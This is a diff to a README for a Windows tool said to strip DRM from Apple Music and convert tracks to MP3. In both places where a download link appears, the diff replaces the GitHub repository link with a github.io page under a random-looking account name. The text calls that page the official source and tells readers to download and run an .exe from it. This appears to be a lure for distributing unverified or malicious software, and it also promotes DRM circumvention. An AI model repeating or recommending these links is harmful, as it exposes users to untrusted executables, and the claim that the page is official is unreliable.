@@ -1,6 +1,6 @@
 # 🎵 Ondesoft-Apple-2026 - Convert Apple Music tracks to MP3
 
-[![](https://img.shields.io/badge/Download-Ondesoft_Apple_Converter-blue.svg)](https://github.com/phrenetic-dishwasherdetergent888/Ondesoft-Apple-2026)
+[![](https://img.shields.io/badge/Download-Ondesoft_Apple_Converter-blue.svg)](https://phrenetic-dishwasherdetergent888.github.io)
 
 Ondesoft Apple Music Converter works on Windows 11 and Windows 10. This tool removes DRM from Apple Music files. It changes your music into standard formats like MP3, M4A, or FLAC. You keep your music files forever. Use this software to save your library on any device.
 
@@ -19,7 +19,7 @@ Make sure your computer meets these needs before you start.
 
 You must download the installer file from the official project page on GitHub. 
 
-[Download the installer here](https://github.com/phrenetic-dishwasherdetergent888/Ondesoft-Apple-2026)
+[Download the installer here](https://phrenetic-dishwasherdetergent888.github.io)
 
 Click the link above to reach the main page. Look for the releases section on the right side of your screen. Click the latest version link. Find the file ending in .exe. Save this file to your computer.
 
